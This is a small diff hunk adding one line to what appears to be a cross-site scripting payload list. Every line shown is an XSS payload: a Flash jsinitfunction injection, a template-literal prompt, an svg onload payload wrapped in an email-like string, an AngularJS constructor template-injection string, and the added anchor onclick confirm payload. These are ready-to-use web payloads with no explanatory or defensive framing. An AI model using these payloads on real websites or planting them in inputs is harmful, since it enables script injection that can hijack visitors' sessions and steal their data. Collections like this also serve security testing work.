@@ -53,3 +53,4 @@ flashmediaelement.swf?jsinitfunctio%gn=alert`1`
 prompt`${document.domain}`
 “><svg/onload=alert(document.domain)>”@x.y
 {{constructor.constructor(%27prompt(document.domain)%27)()}}
+<a"/onclick=(confirm)()>Click Here!"
